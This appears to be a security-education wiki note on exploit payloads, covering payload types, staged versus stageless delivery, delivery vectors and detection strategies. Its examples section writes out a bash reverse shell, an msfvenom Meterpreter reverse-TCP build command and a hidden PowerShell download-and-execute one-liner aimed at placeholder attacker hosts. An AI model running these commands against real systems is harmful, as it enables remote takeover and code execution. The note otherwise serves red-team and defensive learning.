A **payload** is the component of an exploit that performs the attacker's desired actions after a vulnerability is successfully exploited. Payloads are delivered through **exploit frameworks** and can enable **remote control**, **data theft**, **privilege escalation**, or **persistence**.

Understanding different payload types is critical for both **red team operations** and **defensive detection**.

---

## 🎯 Purpose of Payloads

- Establish **remote access** to the compromised system
- Perform **post-exploitation** actions (e.g., data exfiltration, privilege escalation)
- Maintain **persistence** or drop secondary malware
- Gather **intelligence** from the target (e.g., credentials, screenshots)

---

## 🧱 Common Payload Categories

| Payload Type       | Description                                                      |
|--------------------|------------------------------------------------------------------|
| **Reverse Shell**   | Victim connects back to attacker for interactive control         |
| **Bind Shell**      | Victim listens on a port; attacker connects in                   |
| **Meterpreter**     | Advanced Metasploit shell with in-memory execution and modules   |
| **Stager/Stageless**| Staged payloads are modular; stageless are delivered whole       |
| **Beacon**          | Lightweight callback to C2 used for stealth and tasking          |
| **Command Execution** | Executes specific commands, no persistent session               |
| **Downloader/Dropper** | Fetches secondary payload from a remote source               |
| **Privilege Escalation** | Attempts to elevate current permissions                     |
| **Ransomware Module** | Encrypts files and/or delivers ransom instructions             |

---

## 🔁 Payload Execution Models

### 🔄 Staged Payloads
- Split into **stager + stage**
- Initial payload is small and fetches larger component (e.g., shell, beacon)
- **Pro**: Small footprint  
- **Con**: Requires outbound network access

### 🧱 Stageless Payloads
- Delivered in one monolithic blob
- **Pro**: More reliable, fewer moving parts  
- **Con**: Larger and more detectable

---

## 🧪 Examples of Payloads

### 🧨 Reverse Shell (Linux Bash)
```bash
bash -i >& /dev/tcp/attacker_ip/4444 0>&1
```

### 🛰 Meterpreter (Metasploit)
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe > shell.exe
```

### 🔗 PowerShell One-liner
```
powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')"
```

## 🧰 Delivery Vectors

|Vector|Notes|
|---|---|
|**Exploit frameworks**|Metasploit, Sliver, Cobalt Strike|
|**Phishing attachments**|Macro-based Word/Excel files|
|**Malicious links**|Redirects to browser-based exploits|
|**USB/Removable Media**|Autorun payloads or HID emulation|
|**Drive-by Downloads**|Triggered by vulnerable browser or plugin|

---

## 🔐 Common Payload Targets

|OS/Platform|Examples|
|---|---|
|**Windows**|`meterpreter/reverse_tcp`, PowerShell, WMI scripts|
|**Linux/Unix**|Bash shell, ELF droppers, cron persistence|
|**macOS**|Mach-O reverse shells, AppleScript, LaunchDaemons|
|**Web Apps**|PHP/ASP shells, JavaScript droppers|

---

## 🛡️ Defensive Considerations

|Indicator|Detection Strategy|
|---|---|
|Unusual ports/protocols|Monitor outbound traffic (e.g., 53, 443, 4444)|
|Payload obfuscation (Base64, XOR)|Detect via YARA or script block logging|
|Suspicious parent-child process|E.g., `winword.exe → powershell.exe` (LOLBins)|
|Beaconing behavior|Detect with RITA, Zeek, or time-based SIEM correlation|
|In-memory payloads (fileless)|EDR with memory inspection (e.g., CrowdStrike, SentinelOne)|

---

## 🔗 Related Topics

- [[Exploit Frameworks]]
- [[Command and Control (C2)]]
- [[Fileless Malware]]
- [[PowerShell Attacks]]
- [[Defense Evasion Techniques]]
- [[Malware Analysis Workflow]]

---

## 🏷 Tags

#payloads #reverse_shell #meterpreter #red_team #post_exploitation #beacon #dropper #command_execution #c2